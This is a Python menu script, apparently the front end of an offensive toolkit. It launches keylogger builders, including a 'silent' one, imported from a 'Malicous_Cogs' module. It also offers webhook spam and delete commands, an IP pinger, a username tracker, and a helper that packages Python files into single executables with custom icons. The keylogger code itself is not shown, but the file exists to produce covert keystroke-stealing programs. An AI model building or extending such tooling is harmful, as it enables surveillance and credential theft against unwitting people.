import asyncio
import os
import shutil
from cogs.wbh import wbh
from cogs.Malicous_Cogs.silent_keylogger_builder import Silent_KeyLogger
from cogs.Malicous_Cogs.keylogger_builder import keylogger
from cogs.ip_ping import ping_ip
from cogs.username_tracker import Username_Tr

def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def py2exe():
    os.makedirs("EXE", exist_ok=True)
    print("Program is asking for a python file path")
    file_path_raw = input("console//: ")
    file_path = file_path_raw.strip()
    if not os.path.isfile(file_path):
        input("File does not exist... Press Enter to continue...")
        return
    print("Program is asking if you want a icon (y/n)")
    icon_choice = input("console//: ").lower().strip('"')
    if icon_choice == "y":
        print("Program is asking for icon file path")
        icon_path_raw = input("console//: ")
        icon_path = icon_path_raw.strip('"')
        if not os.path.isfile(icon_path):
            input("Icon file does not exist... Press Enter to continue...")
            return
        os.system(f'pyinstaller --onefile --distpath="EXE" --icon="{icon_path}" "{file_path}"')
    else:
        os.system(f'pyinstaller --onefile --distpath="EXE" "{file_path}"')
    shutil.rmtree("build")
    os.remove(f"{os.path.splitext(os.path.basename(file_path))[0]}.spec")

class HelpFuncs:
    def __init__(self):
        pass
    def help(self):
        with open('help.txt', "r") as f:
            print(f.read())
        input("\nPress Enter to Leave...")

    def help_reminder(self):
        if os.path.exists('hr.txt'):
            with open('hr.txt', "r") as f:
                print(f"{f.read()}\n")
        else:
            pass

def main():
    clear()
    help_cl = HelpFuncs()
    help_cl.help_reminder()
    option_raw = input("console//: ")
    option = option_raw.lower().strip()
    if option == "help":
        help_cl.help()
    elif option == "wbh silent_keylogger":
        keylogger_execute = Silent_KeyLogger()
        keylogger_execute.run()
    elif option == "wbh keylogger":
        keylogger_execute = keylogger()
        keylogger_execute.run()
    elif option == "wbh s":
        wbh_s_exec = wbh()
        wbh_s_exec.wbh_s()
    elif option == "wbh sp":
        wbh_sp_exec = wbh()
        wbh_sp_exec.wbh_sp()
    elif option == "wbh delete":
        wbh_delete_exec = wbh()
        wbh_delete_exec.wbh_delete()
    elif option == "wbh info":
        wbh_info_exec = wbh()
        wbh_info_exec.wbh_info()
    elif option == "exit":
        exit()
    elif option == "py2exe":
        py2exe()
    elif option == "rhelp":
        os.remove("hr.py")
    elif option == "ip ping":
        ping_ip()
    elif option == "ut":
        username_tracker = Username_Tr()
        asyncio.run(username_tracker.track_username())
    else:
        print("Invalid command.")
        input("\nPress Enter to continue...")
        main()

while True:
    main()